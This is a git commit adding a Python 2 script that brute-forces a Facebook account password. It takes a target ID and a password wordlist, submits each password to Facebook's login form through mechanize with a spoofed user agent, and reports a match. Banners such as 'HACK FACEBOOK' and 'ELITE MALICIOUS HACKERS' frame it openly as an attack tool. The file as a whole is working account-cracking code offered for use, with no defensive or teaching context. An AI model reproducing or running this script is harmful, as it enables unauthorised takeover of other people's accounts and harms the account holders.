719904255b5b7c90faae7266caa1bc9b082dc9f8
Benyamin-creator <68799057+Benyamin-creator@users.noreply.github.com>
2020-10-23 21:47:00 -0500

    Add files via upload

---
+++ brute.py
@@ -0,0 +1,220 @@
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+
+
+import os
+import sys
+import mechanize
+import cookielib
+import random
+import time
+
+os.system('clear')
+
+def runntek(s):
+        for c in s + '\n':
+                sys.stdout.write(c)
+                sys.stdout.flush()
+                time.sleep(10. / 100)
+
+if sys.platform == "linux" or sys.platform == "linux2":
+     GL = "\033[96;1m" # Blue aqua
+     BB = "\033[34;1m" # Blue light
+     YY = "\033[33;1m" # Yellow light
+     GG = "\033[32;1m" # Green light
+     WW = "\033[0;1m"  # White light
+     RR = "\033[31;1m" # Red light
+     CC = "\033[36;1m" # Cyan light
+     B = "\033[34m"    # Blue
+     Y = "\033[33;1m"  # Yellow
+     G = "\033[32m"    # Green
+     W = "\033[0;1m"   # White
+     R = "\033[31m"    # Red
+     C = "\033[36;1m"  # Cyan
+     rand = (BB,YY,GG,WW,RR,CC)
+     P = random.choice(rand)
+def cover():
+    print """
+
+
+
+
+     """
+
+    runntek(GL+"		NINGUN SISTEMA ES SEGURO *HACK FACEBOOK FUERZA BRUTA*")
+
+    time.sleep(1)
+
+    print " "
+    runntek(RR+"  	      +=================CREATE BY RED-SOCIAL==================+")
+
+    time.sleep(1)
+
+    runntek(GL+"                                                                        ")
+
+    time.sleep(1)
+
+    runntek(G+"		  NO SYSTEM IS SECURE * HACK FACEBOOK GROSS FORCE *")
+
+    time.sleep(1)
+
+    runntek(GL+"									")
+
+    time.sleep(1)
+
+def delay_print(s):
+    for c in s:
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+delay_print
+delay_print (""+RR+"			  ███████████"+WW+"████████████"+RR+"███████████	\n")
+delay_print (""+RR+"			  ███████████"+WW+"████████████"+RR+"███████████	\n")
+delay_print (""+RR+"	                  ███████████"+WW+"████████████"+RR+"███████████        \n")
+delay_print (""+RR+"			  ███████████"+WW+"████████████"+RR+"███████████	\n")
+delay_print (""+RR+"			  ███████████"+WW+"████████████"+RR+"███████████	\n")
+delay_print (""+GL+"                                                                    \n")
+delay_print (""+GL+"				ÉLITE MALICIOUS HACKERS		     \n")
+delay_print (""+GL+"									\n")
+
+print Y+"	                            .xm*f••??T?@hc."
+print Y+"	                          z@^` '~((!!!!!!!?*m."
+print Y+"	                        z$$$K   ~~(/!!!!!!!!!Mh"
+print Y+"	                      .f` +#$k'`~~\!!!!!!!!!!!MMc"
+print Y+"	                     :+     f*! ~:~(!!!!!!!!!!XHMk"
+print Y+"	                     f      + %n:~(!!!!!!!!!!!HMMM."
+print Y+"	                    d          X~!~(!!!!!!!X!X!SMMR"
+print Y+"	                    M :   x::  :~~!>!!!!!!MNWXMMM@R"
+print Y+"	 n                 E ' *  ueeeeiu(!!XUWWWWWXMRHMMM>                    :."
+print Y+"	 E%                E  8 .$$$$$$$$K!!$$$$$$$$&M$RMM>                   ::5"
+print Y+"	z  %                3  $ 4$$$$$$$$!~!*$$$$$$$$!$MM$                 :+ `"
+print Y+"	K   +:              ?> # '#$$$$$#~!!!!TR$$$$$R?@MME               z    R"
+print Y+"	?     %.             5     ^+++~~~:XW!!!!T?T!XSMMM~            :^    J"
+print Y+"	 +.    ^s             ?.       ~~d$X$NX!!!!!!M!MM             f     :~"
+print Y+"	  '+.    #L            *c:.    .~+?!??!!!!!XX@M@~           z+    .*"
+print Y+"	    '+     %L           #c`*!+~~~!/!!!!!!@*TM8M           z*    .~"
+print Y+"	      *:    *%.         *C*X  .!~!~!!!!!X!!!@RF         .#     +"
+print Y+"	        *:    ^%.        9-MX!X!!X~H!!M!N!X$MM        .#`    +*"
+print Y+"	           #:    *n       'L'!~M~)H!M!XX!$!XMXF      .+`   .z"
+print Y+"	             #:    *:      R *H$@@$H$*@$@$@$%M~     z`    +"
+print Y+"	               %:   `*L    'k' M!~M~X!!$!@H!tF    z*    z"
+print Y+"	                 *:   ^*L   *k ~~~!~!!!!!M!X*   z*   .+"
+print Y+"	                  *s   ^*L  '%:.~~~:!!!!XH*  z#   .*"
+print Y+"	                    #s   ^%L  ^*#4@UU@##*  z#   .*"
+print GL+"	                      #s   ^%L           z#   .r"
+print GL+"	                        #s   ^%.       u#   .r"
+print GL+"	                          #i   '%.   u#   .@"
+print GL+"	                            #s   ^%u#   .@"
+print GL+"	                              #s x#   .*"
+print GG+"	                               x#`  .@%."
+print GG+"	                             x#`  .d*  *%."
+print GG+"	                           xf~  .r* #s   *%."
+print RR+"	                     u   x*`  .r*     #s   *%.  x."
+print RR+"	                     %Mu*`  x**         #m.  *%zX"
+print RR+"	                     :R(h x*              *h..*dN."
+print WW+"	                   u@NM5e#>                 7?dMRMh."
+print WW+"	                 z$@M@$#*                    **@MM$hL"
+print WW+"	                u@@MM8*                        **$M@Mh."
+print RR+"	     	      z$RRM8F                             *N@M$bL"
+print RR+"	            5`RM$#                                  'R88f)R"
+print RR+"                  'h.$*                                     #$x*"
+
+
+
+
+cover()
+
+
+email = str(raw_input(GL+" â€¢Introduzca la ID del objetivo\033[33;1m: "))
+
+passwordlist = str(raw_input(WW+" â€¢Ingrese el archivo de Contraseñas\033[95m[ pass.txt, pass1.txt, pass2.txt, pass3.txt ] \033[92;1m: "))
+
+
+#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
+
+
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+
+
+useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
+
+
+def runntek(s):
+        for c in s + '\n':
+                sys.stdout.write(c)
+                sys.stdout.flush()
+                time.sleep(10. / 100)
+
+def main():
+        global br
+        br = mechanize.Browser()
+        cj = cookielib.LWPCookieJar()
+        br.set_handle_robots(False)
+        br.set_handle_redirect(True)
+        br.set_cookiejar(cj)
+        br.set_handle_equiv(True)
+        br.set_handle_referer(True)
+        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+        welcome()
+        search()
+        print " "
+        runntek(RR+"  Wordlis Tidak Ada yang Cocok")
+        runntek(RR+"  Kembangin Wordlistnya Sendiri Cuk")
+        time.sleep(1)
+        print WW+34*"  -"
+        kol()
+
+def kol():
+    nok = raw_input("Edit wordlist cuk.? \033[96;1m[y/n]: ")
+    if nok == "y":
+        print ("Por favor escriba la orden\033[92;1m[ nano pass.txt ] !")
+        print WW+(41*"-")
+        print GL+(" ")
+        os.sys.exit()
+    else:
+        exit(0)
+def brute(password):
+        sys.stdout.write(GG+"\r[+]\033[97;1m Probando ..... {}\n".format(password))
+        sys.stdout.flush()
+        br.addheaders = [('User-agent', random.choice(useragents))]
+        site = br.open(login)
+        br.select_form(nr = 0)
+        br.form['email'] = email
+        br.form['pass'] = password
+        sub = br.submit()
+        log = sub.geturl()
+        if log != login and (not 'login_attempt' in log):
+                        print("\033[92;1m\n\n[+]\033[97;1m Password Encontrada \033[31;1m===| \033[96;1m{}".format(password)) 
+                        print " "
+                        raw_input(WW+"PULSE ENTER PARA SALIR.....")
+                        sys.exit(1)
+
+
+def search():
+        global password
+        passwords = open(passwordlist,"r")
+        for password in passwords:
+                passwords = password.replace("\n","")
+                brute(password)
+
+
+#welcome
+def welcome():
+        wel = GG+"""
+No olvides suscribirte al Canal de Youtube "TecnoSolution"
+Y darle LIKE al Video.... Gracias!!!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \033[96;4mLife Of Programmer\033[92;1m
+       |_|
+      """
+        print wel
+        print " "
+        total = open(passwordlist,"r")
+        total = total.readlines()
+        print " "
+        print GL+" [*] Cuenta a Crackear : {}".format(email)
+        print RR+" [*] Cantidad :" , len(total),WW+ "passwords"
+        print Y+" [*] Cracking, please wait .....\n\n"
+
+if __name__ == '__main__':
+        main()
